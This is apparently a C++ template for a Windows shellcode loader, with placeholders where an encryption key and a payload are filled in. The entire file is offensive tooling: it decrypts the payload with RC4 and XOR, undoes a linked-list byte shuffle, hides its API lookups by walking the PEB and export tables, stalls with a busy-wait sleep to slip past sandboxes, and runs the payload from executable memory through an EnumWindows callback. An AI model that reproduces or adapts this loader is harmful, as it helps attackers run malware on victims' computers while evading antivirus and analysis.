#include <Windows.h>
#include <tlhelp32.h>
#include <winternl.h>
#include <fstream>
#pragma comment(linker,"/entry:WinMain")

#define INTERVAL rand() % 26 
#define MS_PER_SECOND 1000 
#define SLEEPTIME INTERVAL*MS_PER_SECOND 

typedef LPVOID(WINAPI* pfnVirtualAlloc)(_In_opt_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flAllocationType, _In_ DWORD flProtect);
HMODULE MyGetModuleHandle(IN LPCWSTR szModuleName);
PVOID MyGetProcAddress(HMODULE handle, LPCSTR Name);
void __alt_sleepms(size_t ms);
void rc4Decrypt(unsigned char* ciphertext, int ciphertextLength, unsigned char* key, int keyLength);
BOOL Deobfuscate(IN PBYTE pFuscatedBuff, IN SIZE_T sFuscatedSize, OUT PBYTE* ptPayload, OUT PSIZE_T psSize);

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, 
    LPSTR lpCmdLine, int nCmdShow) {

	HGLOBAL resHandle = NULL;
	HRSRC res;
    SIZE_T	DeobfuscatedPayloadSize		= NULL;
	PBYTE	DeobfuscatedPayloadBuffer	= NULL;

    {{RC4_key}}
	{{payload}}

	unsigned int seed = 0;
	for (int i = 0; __TIME__[i] != '\0'; ++i) {
		if (__TIME__[i] >= '0' && __TIME__[i] <= '9') {
			seed = seed * 10 + (__TIME__[i] - '0');
		}
	}

	srand(seed);
	__alt_sleepms(SLEEPTIME * 12);

	pfnVirtualAlloc fnVirtualAlloc = (pfnVirtualAlloc)MyGetProcAddress(MyGetModuleHandle(L"kernel32.dll"), "VirtualAlloc");

	rc4Decrypt(payload, sizeof(payload), RC4key, sizeof(RC4key));
	
	unsigned char key[] = {0xbc, 0xab, 0xcb};
    for (int i=0;i<sizeof(payload);i++){
        for(int j=0;j<sizeof(key);j++){
            payload[i]^=key[j];
        }
    }

    if (!Deobfuscate(payload, sizeof(payload), &DeobfuscatedPayloadBuffer, &DeobfuscatedPayloadSize)) {
		return -1;
	}
	LPVOID Memory = fnVirtualAlloc(NULL, DeobfuscatedPayloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	RtlMoveMemory(Memory, DeobfuscatedPayloadBuffer, DeobfuscatedPayloadSize);
	EnumWindows((WNDENUMPROC)Memory, 0);
	return 0;
}


void rc4Decrypt(unsigned char* ciphertext, int ciphertextLength, unsigned char* key, int keyLength) {
    unsigned char S[256];
    for (int i = 0; i < 256; ++i) {
        S[i] = i;
    }

    int j = 0;
    for (int i = 0; i < 256; ++i) {
        j = (j + S[i] + key[i % keyLength]) % 256;
        std::swap(S[i], S[j]);
    }

    int i = 0;
    j = 0;
    for (int k = 0; k < ciphertextLength; ++k) {
        i = (i + 1) % 256;
        j = (j + S[i]) % 256;
        std::swap(S[i], S[j]);
        int t = (S[i] + S[j]) % 256;
        ciphertext[k] ^= S[t];
    }
}

BOOL StringEq(IN LPCWSTR s1, IN LPCWSTR s2) {

    WCHAR  lStr1[MAX_PATH],
        lStr2[MAX_PATH];

    int    len1 = lstrlenW(s1),
        len2 = lstrlenW(s2);

    int    i = 0,
        j = 0;

    if (len1 >= MAX_PATH || len2 >= MAX_PATH)
        return FALSE;

    for (i = 0; i < len1; i++) {
        lStr1[i] = (WCHAR)tolower(s1[i]);
    }
    lStr1[i++] = L'\0';


    for (j = 0; j < len2; j++) {
        lStr2[j] = (WCHAR)tolower(s2[j]);
    }
    lStr2[j++] = L'\0';


    if (lstrcmpiW(lStr1, lStr2) == 0)
        return TRUE;

    return FALSE;

}

HMODULE MyGetModuleHandle(IN LPCWSTR szModuleName) {


#ifdef _WIN64 
    PPEB pPeb = (PEB*)(__readgsqword(0x60));
#elif _WIN32
    PPEB pPeb = (PEB*)(__readfsdword(0x30));
#endif

    PPEB_LDR_DATA pLdr = (PPEB_LDR_DATA)(pPeb->Ldr);


    PLDR_DATA_TABLE_ENTRY pDte = (PLDR_DATA_TABLE_ENTRY)(pLdr->InMemoryOrderModuleList.Flink);


    while (pDte) {
        if (pDte->FullDllName.Length != 0) {
            if (StringEq(pDte->FullDllName.Buffer, szModuleName)) {

#ifdef STRUCTS
                return (HMODULE)(pDte->InMemoryOrderLinks.Flink);
#else
                return (HMODULE)(pDte->Reserved2[0]);
#endif

            }
        }
        else {
            break;
        }
        pDte = *(PLDR_DATA_TABLE_ENTRY*)(pDte);
    }
    return NULL;

}


PVOID MyGetProcAddress(HMODULE handle, LPCSTR Name) {
    PBYTE pBase = (PBYTE)handle;

    PIMAGE_DOS_HEADER pdosHeader = (PIMAGE_DOS_HEADER)pBase;
    if (pdosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }

    PIMAGE_NT_HEADERS pImageNtHeaders = (PIMAGE_NT_HEADERS)(pBase + pdosHeader->e_lfanew);
    if (pImageNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return NULL;
    }

    IMAGE_OPTIONAL_HEADER peOptionHeader = pImageNtHeaders->OptionalHeader;
    PIMAGE_EXPORT_DIRECTORY pExportVirtualAddress = (PIMAGE_EXPORT_DIRECTORY)(pBase + peOptionHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);

    PDWORD FunctionNameArray = (PDWORD)(pBase + pExportVirtualAddress->AddressOfNames);
    PDWORD FunctionAddressArray = (PDWORD)(pBase + pExportVirtualAddress->AddressOfFunctions);
    PWORD ordinArray = (PWORD)(pBase + pExportVirtualAddress->AddressOfNameOrdinals);


    for (DWORD i = 0; i < pExportVirtualAddress->NumberOfFunctions; i++) {
        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);
        PVOID functionAddress = (PVOID)(pBase + FunctionAddressArray[ordinArray[i]]);

        if (strcmp(Name, pFunctionName) == 0) {
            return functionAddress;
        }
    }
    return nullptr;
}


typedef NTSTATUS(WINAPI* pSystemFunction032)(PVOID, PVOID);

unsigned long long __get_timestamp()
{
    const size_t UNIX_TIME_START = 0x019DB1DED53E8000;
    const size_t TICKS_PER_MILLISECOND = 1000;
    LARGE_INTEGER time;
    time.LowPart = *(DWORD*)(0x7FFE0000 + 0x14);
    time.HighPart = *(long*)(0x7FFE0000 + 0x1c);
    return (unsigned long long)((time.QuadPart - UNIX_TIME_START) / TICKS_PER_MILLISECOND);
}

void __alt_sleepms(size_t ms)
{
    volatile size_t x = rand();
    const unsigned long long end = __get_timestamp() + ms;
    while (__get_timestamp() < end) { x += 1; }
    if (__get_timestamp() - end > 2000) return;

}

#define BUFF_SIZE				0x04			
#define NULL_BYTES				0x01	

struct LINKED_LIST;
typedef struct _LINKED_LIST
{
    BYTE					pBuffer[BUFF_SIZE];	    // payload's bytes
    BYTE					pNull[NULL_BYTES];	    // null padded bytes
    INT						ID;						// node id
    struct LINKED_LIST* Next;					    // next node pointer	

}LINKED_LIST, * PLINKED_LIST;

// this will represent the seraizlized size of one node
#define SERIALIZED_SIZE			(BUFF_SIZE + NULL_BYTES + sizeof(INT))	

// serialized payload size:		SERIALIZED_SIZE * (number of nodes)
// number of nodes: (padded payload size) / BUFF_SIZE

typedef enum SORT_TYPE {
    SORT_BY_ID,
    SORT_BY_BUFFER
};


// set the 'sPayloadSize' variable to be equal to the next nearest number that is multiple of 'N'
#define NEAREST_MULTIPLE(sPayloadSize, N)(SIZE_T)((SIZE_T)sPayloadSize + (int)N - ((SIZE_T)sPayloadSize % (int)N))


// used to insert a node at the end of the given linked list
// - LinkedList: a variable pointing to a 'LINKED_LIST' structure, this will represent the linked list head, this variable can be NULL, and thus will be initialized here
// - pBuffer: the payload chunk (of size 'BUFF_SIZE')
// - ID: the id of the node 
PLINKED_LIST InsertAtTheEnd(IN OUT PLINKED_LIST LinkedList, IN PBYTE pBuffer, IN INT ID)
{

    // new tmp pointer, pointing to the head of the linked list
    PLINKED_LIST pTmpHead = (PLINKED_LIST)LinkedList;

    // creating a new node
    PLINKED_LIST pNewNode = (PLINKED_LIST)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(LINKED_LIST));
    if (!pNewNode)
        return NULL;
    memcpy(pNewNode->pBuffer, pBuffer, BUFF_SIZE);
    pNewNode->ID = ID;
    pNewNode->Next = NULL;

    // if the head is null, it will start at the new node we created earlier
    if (LinkedList == NULL) {
        LinkedList = pNewNode;
        return LinkedList;
    }

    // else we will keep walking down the linked list till we find an empty node 
    while (pTmpHead->Next != NULL)
        pTmpHead = pTmpHead->Next;

    // pTmpHead now is the last node in the linked list
    // setting the 'Next' value to the new node
    pTmpHead->Next = pNewNode;

    // returning the head of the linked list
    return LinkedList;
}


// covert raw payload bytes to a linked list
// - pPayload: Base Address of the payload
// - sPayloadSize: pointer to a SIZE_T variable that holds the size of the payload, it will be set to the serialized size of the linked list
// - ppLinkedList: pointer to a LINKED_LIST structure, that will represent the head of the linked list
BOOL InitializePayloadList(IN PBYTE pPayload, IN OUT PSIZE_T sPayloadSize, OUT PLINKED_LIST* ppLinkedList)
{

    // variable used to count the linked list elements (used to calculate the final size)
    // it is also used as the node's ID
    unsigned int x = 0;


    // setting the payload size to be multiple of 'BUFF_SIZE'
    SIZE_T	sTmpSize = NEAREST_MULTIPLE(*sPayloadSize, BUFF_SIZE);
    if (!sTmpSize)
        return FALSE;

    // new padded buffer 
    PBYTE	pTmpBuffer = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sTmpSize);
    if (!pTmpBuffer)
        return FALSE;

    memcpy(pTmpBuffer, pPayload, *sPayloadSize);

    // for each 'BUFF_SIZE' in the padded payload, add it to the linked list
    for (int i = 0; i < sTmpSize; i++) {
        if (i % BUFF_SIZE == 0) {
            *ppLinkedList = InsertAtTheEnd((PLINKED_LIST)*ppLinkedList, &pTmpBuffer[i], x);
            x++;
        }
    }

    // updating the size to be the size of the whole *serialized* linked list
    *sPayloadSize = SERIALIZED_SIZE * x;

    // if the head is null
    if (*ppLinkedList == NULL)
        return FALSE;

    return TRUE;
}


//------------------------------------------------------------------------------------------------------------------------------------------------------
// the following is the mergesort algorithm implementation

// split the nodes of the list into two sublists
void Split(PLINKED_LIST top, PLINKED_LIST* front, PLINKED_LIST* back) {
    PLINKED_LIST fast = top->Next;
    PLINKED_LIST slow = top;

    /* fast pointer advances two nodes, slow pointer advances one node */
    while (fast != NULL) {
        fast = fast->Next;		/* "fast" moves on first time */
        if (fast != NULL) {
            slow = slow->Next;	/* "slow" moves on first time */
            fast = fast->Next;	/* "fast" moves on second time */
        }
    }

    /* "slow" is before the middle in the list, so split it in two at that point */
    *front = top;
    *back = slow->Next;
    slow->Next = NULL;			/* end of the input list */
}


// merge two linked lists 
PLINKED_LIST Merge(PLINKED_LIST top1, PLINKED_LIST top2, enum SORT_TYPE eType) {
    if (top1 == NULL)
        return top2;
    else
        if (top2 == NULL)
            return top1;

    PLINKED_LIST pnt = NULL;

    int iValue1 = 0;
    int iValue2 = 0;

    switch (eType) {
        // this is used to deobfuscate
    case SORT_BY_ID: {
        iValue1 = (int)top1->ID;
        iValue2 = (int)top2->ID;
        break;
    }
                   // this is used to obfuscate
    case SORT_BY_BUFFER: {
        iValue1 = (int)(top1->pBuffer[0] ^ top1->pBuffer[1] ^ top1->pBuffer[2]);   // calculating a value from the payload buffer chunk
        iValue2 = (int)(top2->pBuffer[0] ^ top2->pBuffer[1] ^ top2->pBuffer[2]);   // calculating a value from the payload buffer chunk
        break;
    }
    default: {
        return NULL;
    }
    }

    /* pick either top1 or top2, and merge them */
    if (iValue1 <= iValue2) {
        pnt = top1;
        pnt->Next = Merge(top1->Next, top2, eType);
    }
    else {
        pnt = top2;
        pnt->Next = Merge(top1, top2->Next, eType);
    }
    return pnt;
}


// the main sorting function
// - pLinkedList : is the head node of the linked list
// - eType :
//      * is set to SORT_BY_BUFFER to obfuscate
//      * is set to SORT_BY_ID to deobfuscate
VOID MergeSort(PLINKED_LIST* top, enum SORT_TYPE eType) {
    PLINKED_LIST tmp = *top, * a, * b;

    if (tmp != NULL && tmp->Next != NULL) {
        Split(tmp, &a, &b);				/* (divide) split head into "a" and "b" sublists */

        /* (conquer) sort the sublists */
        MergeSort(&a, eType);
        MergeSort(&b, eType);

        *top = Merge(a, b, eType);				/* (combine) merge the two sorted lists together */
    }
}


//------------------------------------------------------------------------------------------------------------------------------------------------------


BOOL Deobfuscate(IN PBYTE pFuscatedBuff, IN SIZE_T sFuscatedSize, OUT PBYTE* ptPayload, OUT PSIZE_T psSize) 
{
    PLINKED_LIST	pLinkedList = NULL;

    // deserialize (from buffer to linked list - this must be done to re-order the payload's bytes)
    for (size_t i = 0; i < sFuscatedSize; i++) {
        if (i % SERIALIZED_SIZE == 0)
            pLinkedList = InsertAtTheEnd(pLinkedList, &pFuscatedBuff[i], *(int*)&pFuscatedBuff[i + BUFF_SIZE + NULL_BYTES]);
    }

    // re-ordering the payload's bytes
    MergeSort(&pLinkedList, SORT_BY_ID);

    PLINKED_LIST	pTmpHead = pLinkedList;
    SIZE_T			BufferSize = NULL;
    PBYTE			BufferBytes = (PBYTE)LocalAlloc(LPTR, BUFF_SIZE);
    unsigned int	x = 0x00;

    while (pTmpHead != NULL) {

        BYTE TmpBuffer[BUFF_SIZE] = { 0 };

        // copying the 'pBuffer' element from each node
        memcpy(TmpBuffer, pTmpHead->pBuffer, BUFF_SIZE);

        BufferSize += BUFF_SIZE;

        // reallocating to fit the new buffer
        if (BufferBytes != NULL) {
            BufferBytes = (PBYTE)LocalReAlloc(BufferBytes, BufferSize, LMEM_MOVEABLE | LMEM_ZEROINIT);
            memcpy((PVOID)(BufferBytes + (BufferSize - BUFF_SIZE)), TmpBuffer, BUFF_SIZE);
        }

        pTmpHead = pTmpHead->Next;
        x++; // number if nodes
    }

    *ptPayload = BufferBytes;  // payload base address 
    *psSize = x * BUFF_SIZE; // payload size


    // free linked list's nodes
    pTmpHead = pLinkedList;
    PLINKED_LIST pTmpHead2 = pTmpHead->Next;
    
    while (pTmpHead2 != NULL) {

        if (!HeapFree(GetProcessHeap(), 0, (PVOID)pTmpHead)) {
            // failed
        }
        pTmpHead    = pTmpHead2;
        pTmpHead2   = pTmpHead2->Next;
    }
  


    if (*ptPayload != NULL && *psSize < sFuscatedSize)
        return 1;
    else
        return 0;
}


